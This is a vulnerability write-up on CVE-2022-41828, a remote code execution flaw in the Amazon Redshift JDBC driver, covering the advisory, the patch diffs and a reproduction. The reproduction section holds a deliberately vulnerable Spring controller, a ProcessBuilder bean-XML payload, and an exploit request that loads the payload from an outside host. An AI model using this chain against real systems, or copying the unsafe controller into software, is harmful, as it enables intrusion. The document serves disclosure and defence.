### <b>[CVE-2022-41828] Amazon AWS Redshift JDBC Driver Remote Code Execution (RCE)</b>
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
![Platform Badge](https://img.shields.io/badge/Component-redshift--jdbc--42%20<%3D%202.1.0.7-green?logo=amazon%20aws&style=plastic)
![Ecosystem](https://img.shields.io/badge/Ecosystem-Maven-blue?logo=apache%20maven&style=plastic)

[`The Amazon JDBC Driver for Redshift`](https://github.com/aws/amazon-redshift-jdbc-driver) is a Type 4 JDBC driver that provides database connectivity through the standard JDBC application program interfaces (APIs) available in the Java Platform, Enterprise Editions. The Driver provides access to Redshift from any Java application, application server, or Java-enabled applet.

A potential remote command execution issue exists within `redshift-jdbc42` versions 2.1.0.7 and below. When plugins are used with the driver, it instantiates plugin instances based on Java class names provided via the `sslhostnameverifier`, `socketFactory`, `sslfactory`, and `sslpasswordcallback` connection properties. In affected versions, the driver does not verify if a plugin class implements the expected interface before instantiatiaton. This can lead to loading of arbitrary Java classes, which a knowledgeable attacker with control over the JDBC URL can use to achieve remote code execution.

### Patches
This issue is patched within `redshift-jdbc-42` version 2.1.0.8 and above

### Workarounds
AWS advises customers using plugins to upgrade to `redshift-jdbc42` version 2.1.0.8 or above. There are no known workarounds for this issue.

### Patch analysis: GitHub issue and related commits

In order to fix this issue, modifications have been made in 4 different Java classes in commit [`aws/amazon-redshift-jdbc-driver@9999659`](https://github.com/aws/amazon-redshift-jdbc-driver/commit/9999659bbc9f3d006fb02a0bf39d5bcf3b503605). These classes are as follows, respectively.

* [`src/main/java/com/amazon/redshift/core/SocketFactoryFactory.java`](https://github.com/aws/amazon-redshift-jdbc-driver/commit/9999659bbc9f3d006fb02a0bf39d5bcf3b503605#diff-973b9315fe934e1df8e4aecfd830bda0aeb28fc27d9e97867f15d13194950bca)
```java
@@ -38,7 +38,7 @@ public static SocketFactory getSocketFactory(Properties info) throws RedshiftExc
      return SocketFactory.getDefault();
    }
    try {
      //removed return (SocketFactory) ObjectFactory.instantiate(socketFactoryClassName, info, true, RedshiftProperty.SOCKET_FACTORY_ARG.get(info));
      return ObjectFactory.instantiate(SocketFactory.class, socketFactoryClassName, info, true, RedshiftProperty.SOCKET_FACTORY_ARG.get(info)); //added
    } catch (Exception e) {
      throw new RedshiftException(
@@ -66,7 +66,7 @@ public static SSLSocketFactory getSslSocketFactory(Properties info) throws Redsh
      if (classname.equals(RedshiftConnectionImpl.NON_VALIDATING_SSL_FACTORY))
      		classname = NonValidatingFactory.class.getName();

      //removed return (SSLSocketFactory) ObjectFactory.instantiate(classname, info, true, RedshiftProperty.SSL_FACTORY_ARG.get(info));
      return  ObjectFactory.instantiate(SSLSocketFactory.class, classname, info, true, RedshiftProperty.SSL_FACTORY_ARG.get(info)); //added
    } catch (Exception e) {
      throw new RedshiftException(
```
![commit-1](https://user-images.githubusercontent.com/16391655/212278575-5165cbb4-c1ef-447e-b51f-089dea06768f.png)

* [`src/main/java/com/amazon/redshift/ssl/LibPQFactory.java`](https://github.com/aws/amazon-redshift-jdbc-driver/commit/9999659bbc9f3d006fb02a0bf39d5bcf3b503605#diff-8fe856c22dd22f1ab2efb00053230d1be0f1883b146ae04a621a981baca485dd)
```java
@@ -61,7 +61,7 @@ private CallbackHandler getCallbackHandler(Properties info) throws RedshiftExcep
    String sslpasswordcallback = RedshiftProperty.SSL_PASSWORD_CALLBACK.get(info);
    if (sslpasswordcallback != null) {
      try {
        //removed cbh = (CallbackHandler) ObjectFactory.instantiate(sslpasswordcallback, info, false, null);
        cbh =  ObjectFactory.instantiate(CallbackHandler.class, sslpasswordcallback, info, false, null); //added
      } catch (Exception e) {
        throw new RedshiftException(
          GT.tr("The password callback class provided {0} could not be instantiated.",
```
![commit-2](https://user-images.githubusercontent.com/16391655/212279716-e2f11f70-775d-44a5-a959-db5602f10dc3.png)

* [`src/main/java/com/amazon/redshift/ssl/MakeSSL.java`](https://github.com/aws/amazon-redshift-jdbc-driver/commit/9999659bbc9f3d006fb02a0bf39d5bcf3b503605#diff-35adc415a86be148299e914739f1a0b17e1de67ebaab5f8d9e17ebd44cfdb415)
```java
@@ -59,7 +59,7 @@ private static void verifyPeerName(RedshiftStream stream, Properties info, SSLSo
      sslhostnameverifier = "RedshiftjdbcHostnameVerifier";
    } else {
      try {
        //removed hvn = (HostnameVerifier) instantiate(sslhostnameverifier, info, false, null);
        hvn = instantiate(HostnameVerifier.class, sslhostnameverifier, info, false, null); //added
      } catch (Exception e) {
        throw new RedshiftException(
            GT.tr("The HostnameVerifier class provided {0} could not be instantiated.",
```
![commit-3](https://user-images.githubusercontent.com/16391655/212279825-90816261-235d-4dfd-9632-de9dd31ade6d.png)

* [`src/main/java/com/amazon/redshift/util/ObjectFactory.java`](https://github.com/aws/amazon-redshift-jdbc-driver/commit/9999659bbc9f3d006fb02a0bf39d5bcf3b503605#diff-744bd65f08700b011b292ce5b4dd8c64f3a95a458f183c6ee0b6189ae5974eaf)
```java   
@@ -34,13 +34,13 @@ public class ObjectFactory {
   * @throws IllegalAccessException if something goes wrong
   * @throws InvocationTargetException if something goes wrong
   */
  //removed public static Object instantiate(String classname, Properties info, boolean tryString,
  public static <T> T instantiate(Class<T> expectedClass, String classname, Properties info, boolean tryString, //added
      String stringarg) throws ClassNotFoundException, SecurityException, NoSuchMethodException,
          IllegalArgumentException, InstantiationException, IllegalAccessException,
          InvocationTargetException {
    Object[] args = {info};
    Constructor<?> ctor = null; //removed
    Class<?> cls = Class.forName(classname); //removed
    Constructor<? extends T> ctor = null; //added
    Class<? extends T> cls = Class.forName(classname).asSubclass(expectedClass); //added    
    try {
      ctor = cls.getConstructor(Properties.class);
    } catch (NoSuchMethodException nsme) {
```
![commit-4](https://user-images.githubusercontent.com/16391655/212279956-194806eb-c493-4402-8f76-e78fba27f981.png)

### Reproducing: Developing vulnerable application and exploitation steps
To reproduce CVE-2022-41828, a vulnerable Java application with Spring framework uses a vulnerable redshift-jdbc42 version 2.1.0.7 driver as the external library is developed.

The following code snippets represent the content of the `pom.xml` file.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>
    <parent>
        <groupId>org.springframework.boot</groupId>
        <artifactId>spring-boot-starter-parent</artifactId>
        <version>2.7.5</version>
        <relativePath/> <!-- lookup parent from repository -->
    </parent>
    <groupId>com.example</groupId>
    <artifactId>RedshiftJdbcRce</artifactId>
    <version>0.0.1-SNAPSHOT</version>
    <name>RedshiftJdbcRce</name>
    <description>RedshiftJdbcRce</description>
    <properties>
        <java.version>1.8</java.version>
    </properties>
    <dependencies>
        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-web</artifactId>
        </dependency>

        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-test</artifactId>
            <scope>test</scope>
        </dependency>

        <!-- https://mvnrepository.com/artifact/com.amazon.redshift/redshift-jdbc42 -->
        <dependency>
            <groupId>com.amazon.redshift</groupId>
            <artifactId>redshift-jdbc42</artifactId>
            <version>2.1.0.7</version>
        </dependency>

        <dependency>
            <groupId>commons-beanutils</groupId>
            <artifactId>commons-beanutils</artifactId>
            <version>1.9.4</version>
        </dependency>
    </dependencies>

    <build>
        <plugins>
            <plugin>
                <groupId>org.springframework.boot</groupId>
                <artifactId>spring-boot-maven-plugin</artifactId>
            </plugin>
        </plugins>
    </build>

</project>
```
![pom xml](https://user-images.githubusercontent.com/16391655/206461393-85dd9bd0-4175-4d8a-9af6-9e73e4752471.png)

The following code snippets represent the content of the `src/main/java/com/example/redshiftjdbcrce/controller/RedshiftJdbcRCE.java` controller class.
```java
package com.example.redshiftjdbcrce.controller;

import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.sql.DriverManager;
import java.sql.SQLException;

@RestController
public class RedshiftJdbcRCE {
    @RequestMapping("/jdbcset")
    public void jdbcSet(HttpServletRequest request, HttpServletResponse response) throws SQLException {
        String jdbcurl = request.getParameter("jdbc");
        DriverManager.getConnection(jdbcurl);
    }

    public static void main(String[] args) throws SQLException {
    }
}
```
![RedshiftJdbcRCE java](https://user-images.githubusercontent.com/16391655/206466305-338a5131-91d1-4710-94ee-996d13c2cac6.png)

The following file represent the content of the constructor of XML document structure `cmd.xml` which used during exploitation.

```xml
<beans
    xmlns="http://www.springframework.org/schema/beans"
    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
    <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
        <constructor-arg>
            <list>
                <!--<value>touch</value>-->
                <!--<value>/tmp/CVE-2022-41828</value>-->
                <value>gnome-calculator</value>
            </list>
        </constructor-arg>
    </bean>
</beans>
```

Before trigging the vulnerability, the relevant `cmd.xml` file is served over HTTP so that it can be accessed by the target server.
```console
root@kali:~$ python3 -m http.server 2121
```

To trigger/exploit the vulnerability, a request along with the payload is sent as follows.
```
POST /jdbcset HTTP/1.1
Host: 127.0.0.1:8081
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 173

jdbc=jdbc:redshift://127.0.0.1:5439/testdb;socketFactory=org.springframework.context.support.FileSystemXmlApplicationContext;socketFactoryArg=http://172.22.0.43:2121/cmd.xml
```

```
HTTP/1.1 500 
Content-Type: application/json
Date: Thu, 08 Dec 2022 13:58:14 GMT
Connection: close
Content-Length: 108

{
  "timestamp": "2022-12-08T13:58:14.295+00:00",
  "status": 500,
  "error": "Internal Server Error",
  "path": "/jdbcset"
}
```
![request-and-response](https://user-images.githubusercontent.com/16391655/206471800-d69f11c0-0e0e-46c7-93ae-88407ec219f3.png)

https://user-images.githubusercontent.com/16391655/206683655-950cd80e-e5d2-45ab-b3eb-64d7f29d8315.mp4

### References
For more information about remediation of this vulnerability, please visit the following resources:
- GitHub Advisory Database: [`AWS Redshift JDBC Driver fails to validate class type during object instantiation`](https://github.com/advisories/GHSA-5c6q-f783-h888)
- GitHub Advisory Database: [`Potential remote command execution within redshift-jdbc-42 <= 2.1.0.7`](https://github.com/aws/amazon-redshift-jdbc-driver/security/advisories/GHSA-jc69-hjw2-fm86)
- Commit for Release of 2.1.0.8 version: [`aws/amazon-redshift-jdbc-driver@40b143b`](https://github.com/aws/amazon-redshift-jdbc-driver/commit/40b143b4698faf90c788ffa89f2d4d8d2ad068b5)
- Commit for Fix Object Factory to check class type when instantiating an object from class: [`aws/amazon-redshift-jdbc-driver@9999659`](https://github.com/aws/amazon-redshift-jdbc-driver/commit/9999659bbc9f3d006fb02a0bf39d5bcf3b503605)
- Tenable Advisory: [`CVE-2022-41828`](https://www.tenable.com/cve/CVE-2022-41828)
- NIST Advisory: [`CVE-2022-41828`](https://nvd.nist.gov/vuln/detail/CVE-2022-41828)
- MITRE Advisory: [`CVE-2022-41828`](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2022-41828)

### Credits
- Special thanks to [Bearcat](https://twitter.com/d9g3gg) helping me during reproduction of this vulnerability.
